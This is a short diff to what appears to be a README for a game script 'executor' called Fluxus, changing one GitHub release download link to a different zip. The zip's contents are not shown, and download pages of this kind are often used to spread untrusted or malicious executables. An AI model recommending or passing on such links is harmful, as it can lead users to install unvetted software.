@@ -22,7 +22,7 @@ Whether you're a developer looking to test your game's mechanics or someone who 
 
 Get the latest version of the executor by clicking the button below:
 
-[DOWNLOAD](https://github.com/GhostlyBow/Fluxus-executor/releases/download/7.0.11/Fluxus-7.1.zip)
+[DOWNLOAD](https://github.com/GhostlyBow/Fluxus-executor/releases/download/7.0.1/Fluxus.zip)
 
 
 
